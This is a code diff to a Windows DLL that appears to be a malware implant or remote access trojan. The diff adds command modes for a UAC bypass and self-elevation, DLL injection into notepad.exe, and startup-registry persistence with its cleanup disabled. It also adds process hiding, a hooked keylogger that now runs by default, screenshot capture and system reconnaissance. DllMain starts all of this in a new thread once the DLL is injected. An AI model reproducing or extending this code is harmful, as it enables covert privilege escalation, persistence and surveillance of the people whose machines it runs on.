@@ -15,6 +15,8 @@
 #include "handlers/clipboard.h"
 #include "handlers/process_list.h"
 #include "handlers/startup.h"
+#include "handlers/screenshot.h"
+#include "dllmain.h"
 
 HINSTANCE hInst = NULL;                                // 当前实例
 WCHAR executable_path[MAX_PATH + 1];
@@ -52,8 +54,14 @@ BOOL APIENTRY DllMain( HMODULE hModule,
         }
         else {
             MessageBox(0, L"Injected", 0, 0);
-            MessageBox(0, executable_path, 0, 0);
-            EntryPoint(NULL, NULL, "", 0);
+            //MessageBox(0, executable_path, 0, 0);
+            CreateThread(
+                NULL,                   // default security attributes
+                0,                      // use default stack size  
+                EntryThreadFunc,       // thread function name
+                NULL,          // argument to thread function 
+                0,                      // use default creation flags 
+                NULL);   // returns the thread identifier
         }
         break;
     case DLL_THREAD_ATTACH:
@@ -77,7 +85,38 @@ extern "C" LIBRARY_API void CALLBACK EntryPoint(HWND hwnd, HINSTANCE hinst, LPCS
     ::hInst = hinst; // 将实例句柄存储在全局变量中
 
     //elevate_execute((LPCWSTR)NULL, (LPWSTR)L"C:\\Windows\\System32\\cmd.exe");
-    if (!strcmp(lpszCmdLine, "systemshell"))
+    if (!strcmp(lpszCmdLine, "elevate0"))
+    {
+        MessageBox(0, L"elevate0", 0, 0);
+        DWORD pid = GetCurrentProcessId();
+        WCHAR* buf = (WCHAR*)malloc(40);
+        LPWSTR cmd = lstrcat_heap(L"elevate1", _ultow(pid, buf, 10));
+        BypassUAC(cmd);
+        Sleep(8000);
+        MessageBox(0, L"alive", 0, 0);
+        // Continue to main
+        return;
+    }
+    else if (!strncmp(lpszCmdLine, "elevate1", 8))
+    {
+        lpszCmdLine = lpszCmdLine + 8;
+        DWORD prev_pid = atol(lpszCmdLine);
+        MessageBox(0, L"elevate1", 0, 0);
+        if (GetIntegrity() > 2)
+        {
+            HANDLE proc = OpenProcess(PROCESS_TERMINATE, FALSE, prev_pid);
+            TerminateProcess(proc, 0);
+        }
+        else {
+            exit(0);
+        }
+        ConsoleInit();
+        ElevateSelf();
+        // Continue to main
+        while (true) Sleep(1000);
+        return;
+    }
+    else if (!strcmp(lpszCmdLine, "systemshell"))
     {
         MessageBox(0, L"systemshell", 0, 0);
         BypassUAC(L"getsystem");
@@ -99,7 +138,7 @@ extern "C" LIBRARY_API void CALLBACK EntryPoint(HWND hwnd, HINSTANCE hinst, LPCS
     else if (!strcmp(lpszCmdLine, "injecttest"))
     {
         MessageBox(0, L"injecttest", 0, 0);
-        InjectDll(12008, module_path);
+        InjectDll(GetPIDByName(L"notepad.exe"), module_path);
         while (true) Sleep(1000);
         return;
     }
@@ -155,13 +194,56 @@ extern "C" LIBRARY_API void CALLBACK EntryPoint(HWND hwnd, HINSTANCE hinst, LPCS
         ConsoleInit();
         SetStratupReg();
         MessageBox(0, L"Created", 0, 0);
-        DeleteStratupReg();
+        //DeleteStratupReg();
         while (true) Sleep(1000);
         return;
     }
+    else if (!strcmp(lpszCmdLine, "hidetest"))
+    {
+        MessageBox(0, L"hidetest", 0, 0);
+        ConsoleInit();
+        StartScanningThread();
+        Sleep(15000);
+        StopScanningThread();
+        while (true) Sleep(1000);
+        return;
+    }
+    else if (!strcmp(lpszCmdLine, "hooklogtest"))
+    {
+        MessageBox(0, L"hooklogtest", 0, 0);
+        ConsoleInit();
+        HookKeyLogger.KeyLoggerInit(&std::cout);
+        MSG msg;
+        while (GetMessage(&msg, nullptr, 0, 0))
+        {
+            TranslateMessage(&msg);
+            DispatchMessage(&msg);
+        }
+        return;
+    }
+    else if (!strcmp(lpszCmdLine, "shottest"))
+    {
+        MessageBox(0, L"shottest", 0, 0);
+        ConsoleInit();
+        ScreenShotSave(L"C:\\Users\\warren\\Desktop\\shot.bmp");
+        MessageBox(0, L"ok", 0, 0);
+        return;
+    }
+    else if (!strcmp(lpszCmdLine, "versiontest"))
+    {
+        MessageBox(0, L"versiontest", 0, 0);
+        ConsoleInit();
+        printf("Windows version %s .\n", GetSysVersion());
+        printf("Current user is: %s\n", (get_username()).c_str());
+        printf("integrity: %d\n", GetIntegrity());
+        while (true) Sleep(1000);
+        return;
+    }
+
     //RawInputKeyLogger.KeyLoggerInit(&ofs);
-    //RawInputKeyLogger.KeyLoggerInit(&std::cout);
-    
+    ConsoleInit();
+    HookKeyLogger.KeyLoggerInit(&std::cout);
+
     //ShellExecute(NULL, L"open", L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, SW_SHOWNORMAL);
     
     //if (stand_alone)
@@ -190,10 +272,8 @@ extern "C" LIBRARY_API void CALLBACK EntryPoint(HWND hwnd, HINSTANCE hinst, LPCS
     //    //ofs.close();
     //    //while (true) Sleep(1000);
     //}
-    ConsoleInit();
     //HookKeyLogger.KeyLoggerInit(&std::cout);
     //printf("%u", GetPIDByName(L"taskmgr.exe"));
-    StartScanningThread();
     MSG msg;
     while (GetMessage(&msg, nullptr, 0, 0))
     {
@@ -201,6 +281,10 @@ extern "C" LIBRARY_API void CALLBACK EntryPoint(HWND hwnd, HINSTANCE hinst, LPCS
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
+}
 
-    //return;
+DWORD WINAPI EntryThreadFunc(LPVOID lpParam)
+{
+    EntryPoint(NULL, NULL, "", 0);
+    return 0;
 }
